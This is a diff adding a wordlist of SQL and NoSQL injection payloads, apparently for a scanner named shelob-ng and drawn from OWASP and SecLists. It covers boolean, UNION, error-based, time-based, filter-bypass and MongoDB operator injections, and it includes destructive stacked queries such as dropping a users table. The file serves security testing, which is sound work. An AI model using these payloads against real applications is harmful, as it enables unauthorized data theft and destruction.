@@ -1,0 +1,56 @@
+# SQL Injection payloads
+# Lines starting with # are comments and are ignored by shelob-ng.
+# Sources: OWASP testing guide, SecLists, manual curation.
+
+# --- Classic boolean-based ---
+' OR '1'='1
+' OR '1'='1'--
+' OR 1=1--
+' OR 1=1#
+" OR "1"="1
+" OR 1=1--
+1' OR '1'='1
+1 OR 1=1
+1 OR 1=1--
+admin'--
+admin' #
+') OR ('1'='1
+') OR ('1'='1'--
+
+# --- UNION-based (column enumeration) ---
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+1 UNION SELECT null,null--
+1 UNION ALL SELECT NULL,NULL,NULL--
+' UNION SELECT 1,2,3--
+' UNION SELECT table_name,NULL FROM information_schema.tables--
+
+# --- Error-based ---
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--
+' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+1 AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))--
+
+# --- Stacked queries / batch ---
+'; DROP TABLE users--
+'; INSERT INTO users VALUES('hacked','hacked')--
+1; SELECT SLEEP(1)--
+
+# --- Time-based blind ---
+' AND SLEEP(1)--
+1' AND SLEEP(2)--
+'; WAITFOR DELAY '0:0:1'--
+1 AND 1=(SELECT 1 FROM(SELECT SLEEP(1))a)--
+
+# --- Bypass techniques ---
+'/**/OR/**/'1'='1
+' /*!OR*/ '1'='1
+%27 OR %271%27=%271
+\' OR \'1\'=\'1
+
+# --- NoSQL (MongoDB-style) ---
+{"$gt": ""}
+{"$ne": null}
+{"$where": "1==1"}
+{"$regex": ".*"}
+' || '1'=='1
